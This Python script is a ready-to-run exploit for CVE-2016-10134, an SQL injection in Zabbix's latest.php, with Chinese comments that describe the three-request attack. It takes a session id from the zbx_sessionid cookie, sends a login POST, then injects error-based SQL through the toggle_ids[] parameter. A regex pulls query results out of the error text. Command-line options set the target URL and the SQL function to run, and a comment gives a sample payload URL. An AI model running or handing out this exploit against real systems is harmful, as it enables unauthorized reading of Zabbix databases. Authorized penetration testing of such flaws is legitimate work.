import argparse
import re
import requests
from lib import base_def

'''
zabbix latest.php SQL注入漏洞（CVE-2016-10134）
modified by:cyberfive
date:2024.6.26
description:攻击共需要三次请求，第一次get请求获取到cookies,获取zbx_session，并截取其中的后16位用作第二次请求的sid。
            第二次post请求将已获得的sid通过进行注入，第三次get请求在‘toggle_ids[]’参数进行报错注入。
'''


def target_attack(url, sql_payload, proxies, header):
    response = requests.get(url, proxies=proxies, headers=header)
    cookie = response.cookies.get_dict()
    # payload如下：
    # http://your-ip:8080/latest.php?output=ajax&sid=055e1ffa36164a58&favobj=toggle&toggle_open_state=1&toggle_ids[]=updatexml(0,concat(0xa,user()),0)
    # sid=8b0bd1d957ace7bb&form_refresh=1&name=1&password=1&autologin=1&enter=Sign+in
    if response.status_code == 200:
        param = {
            "output": "ajax",
            "sid": str(cookie["zbx_sessionid"][16:]),
            "favobj": "toggle",
            "toggle_open_state": "1",
            "toggle_ids[]": "updatexml(0,concat(0xa," + sql_payload + "),0)"
        }
        post_data = {
            "sid": str(cookie["zbx_sessionid"][16:]),
            "form_refresh": "1",
            "name": "",
            "password": "",
            "autologin": "1",
            "enter": "Sign+in"
        }
        post_res = requests.post(url, data=post_data, proxies=proxies, headers=header, cookies=cookie)
        query_get = "&".join([f'{key}={value}' for key, value in param.items()])
        if post_res.status_code == 200:
            get_res = requests.get(url=url + f'/latest.php?{query_get}', proxies=proxies, headers=header,
                                   cookies=cookie)
            return get_res.text


def resultGet(text):
    pattern = re.compile(r"XPATH syntax error: '</li><li>(.*?)'\]</li>")
    matches = pattern.findall(text)
    for match in matches:
        print(match)


if __name__ == '__main__':
    #-------------脚本初始化部分--------------------
    arg_parser = argparse.ArgumentParser()
    arg_parser.description = "zabbix latest.php SQL注入漏洞（CVE-2016-10134）"
    arg_parser.add_argument("-u", "--url", required=False, help="the target url,like 'http://target.com:8080',"
                                                                "default=http://127.0.0.1:8080)",
                            default="http://127.0.0.1:8080")
    arg_parser.add_argument("-p", "--payload", required=False, help="sql function to be executed,default=user()",
                            default="user()")
    args = arg_parser.parse_args()
    proxies = base_def.default_proxies()
    header = base_def.default_header()
    sql_payload = args.payload
    #--------------------------------------------

    print(args.url)
    tmp_text_1 = target_attack(args.url, sql_payload, proxies, header)
    if tmp_text_1:
        resultGet(tmp_text_1)
